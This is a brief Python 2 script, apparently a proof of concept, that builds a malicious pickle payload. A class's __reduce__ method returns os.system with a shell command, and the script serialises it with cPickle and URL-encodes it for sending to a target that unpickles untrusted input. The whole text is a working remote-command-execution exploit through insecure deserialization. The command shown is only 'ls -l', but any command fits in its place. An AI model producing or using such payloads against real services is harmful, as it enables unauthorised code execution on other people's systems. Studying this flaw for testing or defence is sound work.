import os
import cPickle

# Exploit that we want the target to unpickle
class Exploit(object):
        def __reduce__(self):
                    return (os.system, ('ls -l',))
shellcode = cPickle.dumps(Exploit())
print shellcode.replace("\n",'%0A')
